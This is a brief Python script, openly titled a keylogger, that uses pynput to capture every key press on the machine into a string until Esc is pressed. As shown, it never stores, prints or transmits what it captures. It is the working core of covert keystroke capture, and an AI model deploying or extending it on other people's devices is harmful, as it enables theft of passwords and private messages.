from pynput import keyboard

text = ""

def record_key(key):
    global text
    key = str(key).replace("'", "")

    if key == "Key.enter":
        text += "\n"
    elif key == "Key.space":
        text += " "
    elif key == "Key.backspace":
        text = text[:-1]
    elif key == "Key.esc":
        quit()
    else:
        text += key

def keylogger():
    with keyboard.Listener(on_press=record_key) as listener:
        listener.join()


# Appel de la fonction
if __name__ == "__main__":
    keylogger()
    
